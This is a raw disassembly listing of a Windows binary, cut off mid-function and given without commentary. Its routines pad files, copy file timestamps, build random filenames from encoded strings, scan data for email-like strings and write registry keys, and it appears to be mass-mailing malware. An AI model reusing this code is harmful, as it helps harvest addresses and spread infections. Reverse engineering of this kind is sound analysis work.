; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403F63	proc near		; CODE XREF: sub_40280F+183p
					; sub_404CF1+56p ...

NumberOfBytesWritten= dword ptr	-4
lpFileName	= dword	ptr  8
lDistanceToMove	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		cmp	[ebp+lDistanceToMove], 13000h
		push	ebx
		push	esi
		push	edi
		jl	short loc_403F9D
		push	20h		; dwFileAttributes
		push	[ebp+lpFileName] ; lpFileName
		call	ds:SetFileAttributesA
		xor	ebx, ebx
		push	ebx		; hTemplateFile
		push	20h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	ebx		; lpSecurityAttributes
		push	3		; dwShareMode
		push	0C0000000h	; dwDesiredAccess
		push	[ebp+lpFileName] ; lpFileName
		call	ds:CreateFileA
		mov	edi, eax
		cmp	edi, 0FFFFFFFFh
		jnz	short loc_403FA4

loc_403F9D:				; CODE XREF: sub_403F63+Ej
		xor	eax, eax
		jmp	loc_404028
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403FA4:				; CODE XREF: sub_403F63+38j
		lea	eax, [ebp+NumberOfBytesWritten]
		push	eax		; lpFileSizeHigh
		push	edi		; hFile
		call	ds:GetFileSize
		mov	esi, eax
		cmp	esi, [ebp+lDistanceToMove]
		jle	short loc_403FCB
		push	ebx		; dwMoveMethod
		push	ebx		; lpDistanceToMoveHigh
		push	[ebp+lDistanceToMove] ;	lDistanceToMove
		push	edi		; hFile
		call	ds:SetFilePointer
		push	edi		; hFile
		call	ds:SetEndOfFile
		jmp	short loc_40401E
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403FCB:				; CODE XREF: sub_403F63+51j
		push	2		; dwMoveMethod
		push	ebx		; lpDistanceToMoveHigh
		push	ebx		; lDistanceToMove
		push	edi		; hFile
		call	ds:SetFilePointer
		mov	eax, [ebp+lDistanceToMove]
		sub	eax, esi
		mov	esi, 80000h
		mov	[ebp+lpFileName], eax
		mov	ecx, esi
		cdq
		idiv	ecx
		cmp	eax, ebx
		mov	ebx, ds:WriteFile
		jle	short loc_404009
		mov	[ebp+lDistanceToMove], eax

loc_403FF5:				; CODE XREF: sub_403F63+A4j
		lea	eax, [ebp+NumberOfBytesWritten]
		push	0		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		push	esi		; nNumberOfBytesToWrite
		push	offset Buffer	; lpBuffer
		push	edi		; hFile
		call	ebx ; WriteFile
		dec	[ebp+lDistanceToMove]
		jnz	short loc_403FF5

loc_404009:				; CODE XREF: sub_403F63+8Dj
		lea	eax, [ebp+NumberOfBytesWritten]
		push	0		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		mov	eax, [ebp+lpFileName]
		cdq
		idiv	esi
		push	edx		; nNumberOfBytesToWrite
		push	offset Buffer	; lpBuffer
		push	edi		; hFile
		call	ebx ; WriteFile

loc_40401E:				; CODE XREF: sub_403F63+66j
		push	edi		; hObject
		call	ds:CloseHandle
		push	1
		pop	eax

loc_404028:				; CODE XREF: sub_403F63+3Cj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_403F63	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_40402D	proc near		; CODE XREF: sub_40565D+20Cp

lpFileName	= dword	ptr  8
lpCreationTime	= dword	ptr  0Ch

		push	esi
		push	0		; hTemplateFile
		push	27h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	0		; lpSecurityAttributes
		push	3		; dwShareMode
		push	80000000h	; dwDesiredAccess
		push	[esp+18h+lpFileName] ; lpFileName
		call	ds:CreateFileA
		mov	esi, eax
		cmp	esi, 0FFFFFFFFh
		jnz	short loc_404052
		xor	eax, eax
		pop	esi
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404052:				; CODE XREF: sub_40402D+1Fj
		mov	eax, [esp+lpCreationTime]
		push	edi
		lea	ecx, [eax+10h]
		push	ecx		; lpLastWriteTime
		lea	ecx, [eax+8]
		push	ecx		; lpLastAccessTime
		push	eax		; lpCreationTime
		push	esi		; hFile
		call	ds:GetFileTime
		push	esi		; hObject
		mov	edi, eax
		call	ds:CloseHandle
		mov	eax, edi
		pop	edi
		pop	esi
		retn
sub_40402D	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_404075	proc near		; CODE XREF: sub_40565D+25Fp

lpFileName	= dword	ptr  8
lpCreationTime	= dword	ptr  0Ch

		push	esi
		push	0		; hTemplateFile
		push	27h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	0		; lpSecurityAttributes
		push	3		; dwShareMode
		push	0C0000000h	; dwDesiredAccess
		push	[esp+18h+lpFileName] ; lpFileName
		call	ds:CreateFileA
		mov	esi, eax
		cmp	esi, 0FFFFFFFFh
		jnz	short loc_40409A
		xor	eax, eax
		pop	esi
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40409A:				; CODE XREF: sub_404075+1Fj
		mov	eax, [esp+lpCreationTime]
		push	edi
		lea	ecx, [eax+10h]
		push	ecx		; lpLastWriteTime
		lea	ecx, [eax+8]
		push	ecx		; lpLastAccessTime
		push	eax		; lpCreationTime
		push	esi		; hFile
		call	ds:SetFileTime
		push	esi		; hObject
		mov	edi, eax
		call	ds:CloseHandle
		mov	eax, edi
		pop	edi
		pop	esi
		retn
sub_404075	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4040BD	proc near		; CODE XREF: sub_4022DB+1F0p
					; sub_4022DB+25Cp

var_14		= dword	ptr -14h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	ebx
		lea	ecx, [ebp+var_14]
		call	sub_40174B
		lea	eax, [ebp+var_4]
		push	1
		push	eax
		lea	ecx, [ebp+var_14]
		push	[ebp+arg_0]
		call	sub_40174E
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_404153
		cmp	[ebp+arg_8], 0
		jz	short loc_40410F
		cmp	[ebp+var_4], 19000h
		jbe	short loc_40410F
		push	0
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	0Ah
		pop	ecx
		div	ecx
		add	edx, 4Ch
		shl	edx, 0Ah
		cmp	edx, [ebp+var_4]
		jnb	short loc_40410F
		mov	[ebp+var_4], edx

loc_40410F:				; CODE XREF: sub_4040BD+2Aj
					; sub_4040BD+33j ...
		mov	eax, [ebp+var_4]
		push	esi
		add	eax, eax
		push	eax
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	esi, eax
		pop	ecx
		test	esi, esi
		jz	short loc_404148
		mov	eax, [ebp+var_4]
		add	eax, eax
		push	eax		; size_t
		push	0		; int
		push	esi		; void *
		call	_memset
		push	48h
		push	[ebp+var_4]
		push	esi
		push	ebx
		call	sub_401000
		mov	ecx, [ebp+arg_4]
		add	esp, 1Ch
		test	ecx, ecx
		jz	short loc_404148
		mov	[ecx], eax

loc_404148:				; CODE XREF: sub_4040BD+63j
					; sub_4040BD+87j
		lea	ecx, [ebp+var_14]
		call	sub_401808
		mov	eax, esi
		pop	esi

loc_404153:				; CODE XREF: sub_4040BD+24j
		pop	ebx
		leave
		retn
sub_4040BD	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_404156	proc near		; CODE XREF: sub_401841+9Cp
					; sub_40280F+BDp ...

var_104		= byte ptr -104h
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 104h
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		xor	ebx, ebx
		push	14h		; size_t
		push	ebx		; int
		push	edi		; void *
		mov	[ebp+var_104], bl
		call	_memset
		add	esp, 0Ch
		cmp	byte_491DF4, bl
		jz	short loc_4041BF
		push	ebx
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	3
		pop	ecx
		div	ecx
		test	edx, edx
		jz	short loc_4041BF
		push	1
		push	0Ah
		lea	eax, [ebp+var_104]
		push	ecx
		push	eax
		push	offset byte_491DF4
		call	sub_403944
		add	esp, 14h
		test	eax, eax
		jz	short loc_4041BF
		lea	eax, [ebp+var_104]
		push	eax		; char *
		push	edi		; char *
		call	_strcpy
		pop	ecx
		pop	ecx

loc_4041BF:				; CODE XREF: sub_404156+29j
					; sub_404156+3Bj ...
		cmp	[edi], bl
		jnz	loc_404252
		cmp	byte_491CF0, bl
		jz	short loc_404205
		push	ebx
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	3
		pop	ecx
		div	ecx
		test	edx, edx
		jz	short loc_404205
		lea	eax, [ebp+var_104]
		push	ebx		; char *
		push	eax		; char *
		push	ebx		; char *
		push	ebx		; char *
		push	offset byte_491CF0 ; char *
		call	__splitpath
		lea	eax, [ebp+var_104]
		push	eax		; char *
		push	edi		; char *
		call	_strcpy
		add	esp, 1Ch

loc_404205:				; CODE XREF: sub_404156+77j
					; sub_404156+89j
		cmp	[edi], bl
		jnz	short loc_404252
		push	ebx
		call	sub_4046AB
		test	al, 0Fh
		pop	ecx
		jnz	short loc_40423F
		mov	esi, offset unk_40FD50
		push	ebx
		push	esi
		call	sub_403464
		push	ebx
		mov	[ebp+arg_0], eax
		call	sub_4046AB
		xor	edx, edx
		div	[ebp+arg_0]
		push	edx
		push	esi
		call	sub_403434
		push	eax		; char *
		push	edi		; char *
		call	_strcpy
		add	esp, 1Ch

loc_40423F:				; CODE XREF: sub_404156+BCj
		cmp	[edi], bl
		jnz	short loc_404252
		push	4
		push	6
		push	2
		push	edi
		call	sub_403624
		add	esp, 10h

loc_404252:				; CODE XREF: sub_404156+6Bj
					; sub_404156+B1j ...
		cmp	[ebp+arg_4], ebx
		jz	short loc_404282
		mov	esi, (offset aYRNyWnyvNy_Tnn+20h)
		push	ebx
		push	esi
		call	sub_403464
		push	ebx
		mov	[ebp+arg_0], eax
		call	sub_4046AB
		xor	edx, edx
		div	[ebp+arg_0]
		push	edx
		push	esi
		call	sub_403434
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		add	esp, 1Ch

loc_404282:				; CODE XREF: sub_404156+FFj
		cmp	[ebp+arg_8], ebx
		jz	short loc_404294
		push	[ebp+arg_8]	; char *
		push	edi		; char *
		call	_strcat
		pop	ecx
		pop	ecx
		jmp	short loc_4042C4
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404294:				; CODE XREF: sub_404156+12Fj
		cmp	[ebp+arg_C], ebx
		jz	short loc_4042C4
		mov	esi, offset aYRNyWnyvNy_Tnn ; "yÜRÜny×ßWnyVÚ]ny_ŞTnnnnnnnnnnnnnyTRTnyZ"...
		push	ebx
		push	esi
		call	sub_403464
		push	ebx
		mov	[ebp+arg_0], eax
		call	sub_4046AB
		xor	edx, edx
		div	[ebp+arg_0]
		push	edx
		push	esi
		call	sub_403434
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		add	esp, 1Ch

loc_4042C4:				; CODE XREF: sub_404156+13Cj
					; sub_404156+141j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_404156	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4042C9	proc near		; CODE XREF: sub_40444A+5Cp

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	ebx
		mov	eax, [ebp+arg_10]
		push	esi
		push	edi
		push	[ebp+arg_C]	; size_t
		xor	ebx, ebx
		or	edi, 0FFFFFFFFh
		mov	[ebp+var_4], ebx
		push	ebx		; int
		mov	[ebp+var_8], edi
		push	[ebp+arg_8]	; void *
		mov	[ebp+var_10], ebx
		mov	[ebp+var_C], ebx
		mov	[eax], ebx
		call	_memset
		mov	esi, [ebp+arg_0]
		mov	al, [esi]
		push	eax
		call	sub_403B18
		add	esp, 10h
		test	eax, eax
		jz	loc_404396
		mov	al, [esi]
		push	eax
		call	sub_403B18
		test	eax, eax
		pop	ecx
		jz	short loc_404373
		mov	eax, [ebp+arg_4]
		mov	ebx, esi
		dec	eax
		mov	[ebp+arg_0], eax
		mov	eax, [ebp+arg_8]
		sub	eax, esi
		mov	[ebp+var_14], eax
		jmp	short loc_40432D
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40432A:				; CODE XREF: sub_4042C9+A6j
		mov	eax, [ebp+var_14]

loc_40432D:				; CODE XREF: sub_4042C9+5Fj
		mov	cl, [ebx]
		mov	[eax+ebx], cl
		mov	al, [ebx]
		cmp	al, 40h
		jnz	short loc_404341
		mov	ecx, [ebp+var_10]
		inc	[ebp+var_C]
		mov	[ebp+var_8], ecx

loc_404341:				; CODE XREF: sub_4042C9+6Dj
		cmp	al, 2Eh
		jnz	short loc_40434C
		test	edi, edi
		jge	short loc_40434C
		mov	edi, [ebp+var_10]

loc_40434C:				; CODE XREF: sub_4042C9+7Aj
					; sub_4042C9+7Ej
		inc	[ebp+var_4]
		inc	ebx
		mov	eax, [ebp+var_4]
		inc	[ebp+var_10]
		cmp	eax, [ebp+arg_0]
		jge	short loc_404371
		mov	eax, [ebp+arg_C]
		dec	eax
		cmp	[ebp+var_10], eax
		jge	short loc_404371
		mov	al, [ebx]
		push	eax
		call	sub_403B18
		test	eax, eax
		pop	ecx
		jnz	short loc_40432A

loc_404371:				; CODE XREF: sub_4042C9+90j
					; sub_4042C9+99j
		xor	ebx, ebx

loc_404373:				; CODE XREF: sub_4042C9+4Cj
		mov	eax, [ebp+var_10]
		mov	ecx, [ebp+arg_8]
		sub	edi, [ebp+var_8]
		and	byte ptr [eax+ecx], 0
		cmp	edi, 3
		jle	short loc_404396
		push	1
		pop	eax
		cmp	[ebp+var_8], eax
		jle	short loc_404396
		cmp	[ebp+var_C], eax
		jz	loc_404436

loc_404396:				; CODE XREF: sub_4042C9+3Bj
					; sub_4042C9+BAj ...
		or	[ebp+var_8], 0FFFFFFFFh
		or	[ebp+var_10], 0FFFFFFFFh
		mov	[ebp+var_4], ebx
		mov	bx, [esi]
		xor	edi, edi
		push	ebx
		and	[ebp+var_C], edi
		call	sub_403B72
		test	eax, eax
		pop	ecx
		jz	loc_404442
		push	ebx
		call	sub_403B72
		test	eax, eax
		pop	ecx
		jz	short loc_404417
		mov	eax, [ebp+arg_4]
		dec	eax
		and	[ebp+arg_4], edi
		mov	[ebp+arg_0], eax

loc_4043CD:				; CODE XREF: sub_4042C9+14Cj
		mov	eax, [ebp+arg_8]
		cmp	bl, 40h
		mov	[edi+eax], bl
		jnz	short loc_4043DE
		inc	[ebp+var_C]
		mov	[ebp+var_8], edi

loc_4043DE:				; CODE XREF: sub_4042C9+10Dj
		cmp	bl, 2Eh
		jnz	short loc_4043EC
		cmp	[ebp+var_10], 0
		jge	short loc_4043EC
		mov	[ebp+var_10], edi

loc_4043EC:				; CODE XREF: sub_4042C9+118j
					; sub_4042C9+11Ej
		add	[ebp+arg_4], 4
		add	[ebp+var_4], 2
		mov	eax, [ebp+arg_4]
		inc	edi
		cmp	eax, [ebp+arg_0]
		jge	short loc_404417
		mov	eax, [ebp+arg_C]
		dec	eax
		cmp	edi, eax
		jge	short loc_404417
		mov	eax, [ebp+var_4]
		mov	bx, [eax+esi]
		push	ebx
		call	sub_403B72
		test	eax, eax
		pop	ecx
		jnz	short loc_4043CD

loc_404417:				; CODE XREF: sub_4042C9+F8j
					; sub_4042C9+132j ...
		mov	eax, [ebp+arg_8]
		and	byte ptr [edi+eax], 0
		mov	eax, [ebp+var_10]
		sub	eax, [ebp+var_8]
		cmp	eax, 2
		jle	short loc_40443B
		push	1
		pop	eax
		cmp	[ebp+var_8], eax
		jle	short loc_40443B
		cmp	[ebp+var_C], eax
		jnz	short loc_40443B

loc_404436:				; CODE XREF: sub_4042C9+C7j
		mov	ecx, [ebp+arg_10]
		mov	[ecx], eax

loc_40443B:				; CODE XREF: sub_4042C9+15Ej
					; sub_4042C9+166j ...
		mov	eax, [ebp+var_4]
		add	eax, esi
		jmp	short loc_404445
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404442:				; CODE XREF: sub_4042C9+E9j
		lea	eax, [esi+1]

loc_404445:				; CODE XREF: sub_4042C9+177j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4042C9	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_40444A	proc near		; CODE XREF: sub_405A0C+42p
					; sub_405A58+13Ep ...

var_418		= dword	ptr -418h
var_18		= dword	ptr -18h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 418h
		push	ebx
		xor	ebx, ebx
		push	esi
		lea	ecx, [ebp+var_18]
		mov	[ebp+var_4], ebx
		call	sub_40174B
		lea	eax, [ebp+var_8]
		push	1
		push	eax
		lea	ecx, [ebp+var_18]
		push	[ebp+arg_0]
		call	sub_40174E
		mov	esi, eax
		cmp	esi, ebx
		jnz	short loc_40447D
		xor	eax, eax
		jmp	short loc_4044E0
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40447D:				; CODE XREF: sub_40444A+2Dj
		push	edi
		mov	edi, esi

loc_404480:				; CODE XREF: sub_40444A+6Aj
					; sub_40444A+86j ...
		mov	eax, [ebp+var_8]
		mov	ecx, edi
		sub	ecx, esi
		lea	edx, [eax-1]
		cmp	ecx, edx
		jge	short loc_4044D5
		lea	ecx, [ebp+var_4]
		sub	eax, edi
		push	ecx
		lea	ecx, [ebp+var_418]
		push	400h
		lea	eax, [eax+esi-1]
		push	ecx
		push	eax
		push	edi
		call	sub_4042C9
		add	esp, 14h
		cmp	[ebp+var_4], 0
		mov	edi, eax
		jz	short loc_404480
		push	[ebp+arg_C]
		lea	eax, [ebp+var_418]
		push	[ebp+arg_8]
		push	eax
		push	[ebp+arg_4]
		call	sub_4033AA
		add	esp, 10h
		test	eax, eax
		jle	short loc_404480
		inc	ebx
		jmp	short loc_404480
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4044D5:				; CODE XREF: sub_40444A+42j
		lea	ecx, [ebp+var_18]
		call	sub_401808
		mov	eax, ebx
		pop	edi

loc_4044E0:				; CODE XREF: sub_40444A+31j
		pop	esi
		pop	ebx
		leave
		retn
sub_40444A	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4044E4	proc near		; CODE XREF: sub_40478D+38p
					; sub_404821+72p ...

Type		= dword	ptr -8
cbData		= dword	ptr -4
hKey		= dword	ptr  8
lpSubKey	= dword	ptr  0Ch
lpValueName	= dword	ptr  10h
lpData		= dword	ptr  14h
phkResult	= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		mov	eax, [ebp+phkResult]
		or	[ebp+Type], 0FFFFFFFFh
		push	eax		; size_t
		push	0		; int
		push	[ebp+lpData]	; void *
		mov	[ebp+cbData], eax
		call	_memset
		add	esp, 0Ch
		lea	eax, [ebp+phkResult]
		push	eax		; phkResult
		push	[ebp+lpSubKey]	; lpSubKey
		push	[ebp+hKey]	; hKey
		call	ds:RegOpenKeyA
		test	eax, eax
		jz	short loc_40451A
		push	1
		pop	eax
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40451A:				; CODE XREF: sub_4044E4+2Fj
		lea	eax, [ebp+cbData]
		push	eax		; lpcbData
		lea	eax, [ebp+Type]
		push	[ebp+lpData]	; lpData
		push	eax		; lpType
		push	0		; lpReserved
		push	[ebp+lpValueName] ; lpValueName
		push	[ebp+phkResult]	; hKey
		call	ds:RegQueryValueExA
		push	[ebp+phkResult]	; hKey
		call	ds:RegCloseKey
		xor	eax, eax
		leave
		retn
sub_4044E4	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_404540	proc near		; CODE XREF: sub_4015FF+134p
					; sub_40280F+3BBp ...

hKey		= dword	ptr  8
phkResult	= dword	ptr  0Ch
lpValueName	= dword	ptr  10h
lpData		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		lea	eax, [ebp+phkResult]
		push	eax		; phkResult
		push	[ebp+phkResult]	; lpSubKey
		push	[ebp+hKey]	; hKey
		call	ds:RegCreateKeyA
		test	eax, eax
		jz	short loc_40455C
		push	1
		pop	eax
		pop	ebp
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40455C:				; CODE XREF: sub_404540+15j
		push	[ebp+lpData]	; char *
		call	_strlen
		pop	ecx
		push	eax		; cbData
		push	[ebp+lpData]	; lpData
		push	1		; dwType
		push	0		; Reserved
		push	[ebp+lpValueName] ; lpValueName
		push	[ebp+phkResult]	; hKey
		call	ds:RegSetValueExA
		push	[ebp+phkResult]	; hKey
		call	ds:RegCloseKey
		xor	eax, eax
		pop	ebp
		retn
sub_404540	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_404586	proc near		; CODE XREF: sub_4048EF+31p
					; sub_405E44+33p

Name		= byte ptr -10Ch
var_8		= dword	ptr -8
phkResult	= dword	ptr -4
hKey		= dword	ptr  8
lpSubKey	= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 10Ch
		lea	eax, [ebp+phkResult]
		push	esi
		push	eax		; phkResult
		xor	esi, esi
		push	[ebp+lpSubKey]	; lpSubKey
		push	[ebp+hKey]	; hKey
		call	ds:RegOpenKeyA
		test	eax, eax
		jz	short loc_4045AA
		xor	eax, eax
		jmp	short loc_404601
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4045AA:				; CODE XREF: sub_404586+1Ej
					; sub_404586+67j
		lea	eax, [ebp+Name]
		push	104h		; cbName
		push	eax		; lpName
		push	esi		; dwIndex
		push	[ebp+phkResult]	; hKey
		call	ds:RegEnumKeyA
		test	eax, eax
		jnz	short loc_4045F3
		cmp	[ebp+arg_8], eax
		jz	short loc_4045EC
		and	[ebp+var_8], eax
		push	[ebp+arg_C]
		lea	eax, [ebp+var_8]
		push	eax
		lea	eax, [ebp+Name]
		push	eax
		push	[ebp+lpSubKey]
		push	[ebp+hKey]
		call	[ebp+arg_8]
		add	esp, 14h
		cmp	[ebp+var_8], 0
		jnz	short loc_4045EF

loc_4045EC:				; CODE XREF: sub_404586+41j
		inc	esi
		jmp	short loc_4045AA
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4045EF:				; CODE XREF: sub_404586+64j
		mov	esi, eax
		jmp	short loc_4045F6
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4045F3:				; CODE XREF: sub_404586+3Cj
		push	1
		pop	esi

loc_4045F6:				; CODE XREF: sub_404586+6Bj
		push	[ebp+phkResult]	; hKey
		call	ds:RegCloseKey
		mov	eax, esi

loc_404601:				; CODE XREF: sub_404586+22j
		pop	esi
		leave
		retn
sub_404586	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_404604	proc near		; CODE XREF: sub_4048EF+6Fp

Data		= byte ptr -814h
ValueName	= byte ptr -414h
Type		= dword	ptr -14h
cbValueName	= dword	ptr -10h
var_C		= dword	ptr -0Ch
cbData		= dword	ptr -8
phkResult	= dword	ptr -4
hKey		= dword	ptr  8
lpSubKey	= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 814h
		push	ebx
		lea	eax, [ebp+phkResult]
		push	esi
		push	eax		; phkResult
